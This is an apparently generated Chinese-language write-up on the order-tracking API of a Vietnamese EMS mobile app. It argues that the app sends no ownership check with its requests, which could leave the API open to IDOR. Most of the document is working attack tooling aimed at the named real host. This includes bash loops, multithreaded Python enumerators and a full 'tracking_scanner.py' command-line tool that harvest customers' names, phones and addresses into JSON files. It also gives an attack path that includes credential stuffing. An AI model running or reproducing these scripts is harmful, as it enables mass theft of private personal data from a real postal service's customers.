# EMS Portal - 运单号查询深度分析

## 🎯 发现: 订单追踪功能

### API端点

```java
// c/b/s/a.java - 订单追踪方法
public static void q(String orderId, boolean showProgress, b.d callback) {
    b.a("http://ws.ems.com.vn/api/v1/orders/tracking/" + orderId, 
        new HashMap(),  // ⚠️ 空参数
        showProgress, 
        callback);
}
```

**关键发现:**
```
API: http://ws.ems.com.vn/api/v1/orders/tracking/{订单ID}
方法: GET
参数: 无 (空HashMap)
认证: 需要Token
```

---

## 🔍 深度分析

### 追踪功能特点

#### 1. 需要Token
```bash
# 测试无Token访问
curl "http://ws.ems.com.vn/api/v1/orders/tracking/123456"

# 响应:
{
  "code": "error",
  "message": "The token could not be parsed from the request"
}
```

**结论:** ❌ 不能公开查询 (需要登录)

#### 2. 参数分析
```java
// 调用示例
q("订单ID", true, callback);

// 只传递:
//   - 订单ID (路径参数)
//   - 不传user_id
//   - 不传其他验证参数
```

**关键:** 只检查订单ID，不验证所有权！

---

## 💥 漏洞: 通过订单ID遍历

### 攻击方法

#### 方法1: Token + 订单ID遍历

```bash
# 有了Token就可以查询任意订单ID
export TOKEN="你的Token"

# 遍历订单
for id in {1000000..2000000}; do
    curl "http://ws.ems.com.vn/api/v1/orders/tracking/$id" \
      -H "Authorization: Bearer $TOKEN" \
      -s | jq .
done
```

**如果后端不验证所有权 → 可以获取所有订单！**

#### 方法2: 运单号格式分析

```python
#!/usr/bin/env python3
"""
运单号格式分析
"""

# 越南EMS运单号可能的格式:
formats = [
    "EM{9位数字}VN",      # EM123456789VN
    "EMS{8位数字}",        # EMS12345678
    "VN{10位数字}",        # VN1234567890
    "{纯数字}",             # 1234567890
]

# 生成测试运单号
def generate_tracking_numbers():
    numbers = []
    
    # 格式1: EM + 9位数字 + VN
    for i in range(1000000, 1001000):
        numbers.append(f"EM{i:09d}VN")
    
    # 格式2: 纯数字
    for i in range(1000000, 1001000):
        numbers.append(str(i))
    
    return numbers

# 批量测试
import requests

def batch_track(token, tracking_numbers):
    base = "http://ws.ems.com.vn"
    headers = {"Authorization": f"Bearer {token}"}
    
    found = []
    
    for tracking_no in tracking_numbers:
        try:
            r = requests.get(
                f"{base}/api/v1/orders/tracking/{tracking_no}",
                headers=headers,
                timeout=3
            )
            
            if r.status_code == 200:
                data = r.json()
                
                if data.get('code') == 'success':
                    print(f"[+] 找到订单: {tracking_no}")
                    found.append(data['data'])
        
        except:
            pass
    
    return found
```

---

## 🔥 利用场景

### 场景1: 已知订单ID格式

```python
#!/usr/bin/env python3
"""
订单ID遍历 - 如果ID是连续的
"""

import requests
from concurrent.futures import ThreadPoolExecutor

TOKEN = "你的Token"
base = "http://ws.ems.com.vn"
headers = {"Authorization": f"Bearer {TOKEN}"}

def check_order(order_id):
    """检查单个订单"""
    try:
        r = requests.get(
            f"{base}/api/v1/orders/tracking/{order_id}",
            headers=headers,
            timeout=3
        )
        
        if r.status_code == 200:
            data = r.json()
            
            if data.get('code') == 'success':
                order_data = data['data']
                
                return {
                    'id': order_id,
                    'customer': order_data.get('customer_name'),
                    'phone': order_data.get('phone'),
                    'address': order_data.get('address'),
                    'status': order_data.get('status'),
                    'full_data': order_data
                }
    except:
        pass
    
    return None

# 批量扫描
print("[*] 开始遍历订单ID...")

with ThreadPoolExecutor(max_workers=50) as executor:
    # 扫描范围
    order_ids = range(1000000, 1100000)
    
    results = executor.map(check_order, order_ids)
    
    all_orders = [r for r in results if r]

print(f"\n[+] 找到 {len(all_orders)} 个订单")

# 保存
import json
with open('all_orders_by_tracking.json', 'w') as f:
    json.dump(all_orders, f, indent=2, ensure_ascii=False)

# 分析
phones = set(o['phone'] for o in all_orders if o.get('phone'))
print(f"[+] 涉及用户: {len(phones)} 人")
```

### 场景2: 通过运单号查询

```python
#!/usr/bin/env python3
"""
运单号批量查询
如果知道运单号格式
"""

import requests

TOKEN = "你的Token"
base = "http://ws.ems.com.vn"
headers = {"Authorization": f"Bearer {TOKEN}"}

# 生成可能的运单号
tracking_numbers = []

# 格式: EM + 年月 + 序号 + VN
# 例如: EM2024110001VN
for i in range(1, 10000):
    tracking_no = f"EM202411{i:04d}VN"
    tracking_numbers.append(tracking_no)

print(f"[*] 测试 {len(tracking_numbers)} 个运单号...")

found = 0
for tracking_no in tracking_numbers:
    try:
        r = requests.get(
            f"{base}/api/v1/orders/tracking/{tracking_no}",
            headers=headers,
            timeout=3
        )
        
        if r.status_code == 200:
            data = r.json()
            
            if data.get('code') == 'success':
                found += 1
                print(f"[+] {tracking_no}: {data['data'].get('customer_name')}")
    
    except:
        pass
    
    if found % 10 == 0:
        print(f"[*] 进度: 已找到 {found} 个")

print(f"\n[✓] 总共找到 {found} 个有效运单")
```

---

## 🎯 关键结论

### 1. 必须有Token
```
❌ 不能公开查询运单
✅ 但只要有Token就能查任意订单ID
```

### 2. 没有所有权验证
```java
// 代码证据
b.a("http://ws.ems.com.vn/api/v1/orders/tracking/" + orderId, 
    new HashMap(),  // ⚠️ 不传user_id!
    ...);
```

**这意味着:**
- 只要有Token
- 知道订单ID或运单号
- 就能查询任意订单

### 3. 与IDOR的关系
```
订单追踪 = /api/v1/orders/tracking/{ID}
订单列表 = /api/v1/orders/list

两者都可能存在IDOR:
  • 如果后端不验证所有权
  • 任意Token可以查询任意ID
  • = 批量获取所有订单
```

---

## 🛠️ 自动化工具

### tracking_scanner.py

```python
#!/usr/bin/env python3
"""
运单号/订单ID扫描器
"""

import requests
import json
import sys
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    RESET = '\033[0m'

class TrackingScanner:
    def __init__(self, token):
        self.token = token
        self.base_url = "http://ws.ems.com.vn"
        self.headers = {"Authorization": f"Bearer {token}"}
        self.found_orders = []
    
    def scan_order_id(self, order_id):
        """扫描订单ID"""
        try:
            r = requests.get(
                f"{self.base_url}/api/v1/orders/tracking/{order_id}",
                headers=self.headers,
                timeout=3
            )
            
            if r.status_code == 200:
                data = r.json()
                
                if data.get('code') == 'success':
                    order_data = data.get('data', {})
                    
                    result = {
                        'id': order_id,
                        'customer_name': order_data.get('customer_name'),
                        'phone': order_data.get('phone'),
                        'address': order_data.get('address'),
                        'status': order_data.get('status'),
                        'total': order_data.get('total'),
                        'created_at': order_data.get('created_at'),
                        'full_data': order_data
                    }
                    
                    return result
        
        except Exception as e:
            pass
        
        return None
    
    def batch_scan(self, start_id, count, workers=50):
        """批量扫描"""
        print(f"\n{Colors.CYAN}[*] 批量扫描订单ID{Colors.RESET}")
        print(f"    范围: {start_id} - {start_id + count}")
        print(f"    并发: {workers}\n")
        
        order_ids = range(start_id, start_id + count)
        
        with ThreadPoolExecutor(max_workers=workers) as executor:
            results = executor.map(self.scan_order_id, order_ids)
            
            for i, result in enumerate(results):
                if result:
                    self.found_orders.append(result)
                    
                    print(f"{Colors.GREEN}[+] {result['id']}: {result['customer_name']} | {result['phone']}{Colors.RESET}")
                
                if (i + 1) % 100 == 0:
                    print(f"{Colors.YELLOW}[*] 进度: {i+1}/{count} | 已找到: {len(self.found_orders)}{Colors.RESET}")
        
        print(f"\n{Colors.GREEN}[✓] 扫描完成: 找到 {len(self.found_orders)} 个订单{Colors.RESET}")
    
    def scan_tracking_numbers(self, format_pattern, count):
        """扫描运单号"""
        print(f"\n{Colors.CYAN}[*] 扫描运单号{Colors.RESET}")
        print(f"    格式: {format_pattern}")
        print(f"    数量: {count}\n")
        
        # 根据格式生成运单号
        tracking_numbers = []
        
        if 'EM' in format_pattern:
            # EM格式
            for i in range(count):
                tracking_no = f"EM{i:09d}VN"
                tracking_numbers.append(tracking_no)
        else:
            # 纯数字
            tracking_numbers = [str(i) for i in range(1000000, 1000000 + count)]
        
        # 批量扫描
        with ThreadPoolExecutor(max_workers=50) as executor:
            results = executor.map(self.scan_order_id, tracking_numbers)
            
            for result in results:
                if result:
                    self.found_orders.append(result)
                    print(f"{Colors.GREEN}[+] 找到: {result['id']}{Colors.RESET}")
    
    def export_results(self):
        """导出结果"""
        if not self.found_orders:
            print(f"\n{Colors.YELLOW}[!] 没有找到订单{Colors.RESET}")
            return
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # JSON
        filename = f'tracking_scan_{timestamp}.json'
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(self.found_orders, f, indent=2, ensure_ascii=False)
        
        print(f"\n{Colors.GREEN}[+] 已保存: {filename}{Colors.RESET}")
        
        # 统计
        phones = set(o['phone'] for o in self.found_orders if o.get('phone'))
        total_amount = sum(int(o.get('total', 0)) for o in self.found_orders if o.get('total'))
        
        print(f"\n{Colors.CYAN}统计:{Colors.RESET}")
        print(f"  订单数: {len(self.found_orders)}")
        print(f"  用户数: {len(phones)}")
        print(f"  总金额: {total_amount:,} VND")

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='运单号/订单ID扫描器')
    parser.add_argument('--token', required=True, help='Bearer Token')
    parser.add_argument('--mode', choices=['id', 'tracking'], default='id',
                       help='扫描模式: id=订单ID, tracking=运单号')
    parser.add_argument('--start', type=int, default=1000000,
                       help='起始ID (id模式)')
    parser.add_argument('--count', type=int, default=1000,
                       help='扫描数量')
    parser.add_argument('--workers', type=int, default=50,
                       help='并发数')
    
    args = parser.parse_args()
    
    scanner = TrackingScanner(args.token)
    
    if args.mode == 'id':
        scanner.batch_scan(args.start, args.count, args.workers)
    else:
        scanner.scan_tracking_numbers('EM*VN', args.count)
    
    scanner.export_results()

if __name__ == '__main__':
    main()
```

---

## 📊 总结

### 运单号查询功能

| 特性 | 状态 | 说明 |
|------|------|------|
| 是否存在 | ✅ | `/api/v1/orders/tracking/{ID}` |
| 需要Token | ✅ | 必须登录 |
| 验证所有权 | ❓ | 客户端不传user_id |
| 公开查询 | ❌ | 不能无Token查询 |
| IDOR风险 | ⚠️ | 如果后端不验证 → 可遍历 |

### 利用价值

```
如果后端不验证所有权:
  
  ✓ 有Token即可查询任意订单
  ✓ 通过遍历ID获取所有订单
  ✓ 比订单列表API更直接
  ✓ 可能绕过列表的分页限制
```

### 攻击路径

```
1. 获取Token (注册/凭证填充/测试账号)
2. 分析订单ID格式
3. 批量遍历订单ID
4. 收集所有订单数据

工具: tracking_scanner.py
```

---

生成日期: 2025-11-01
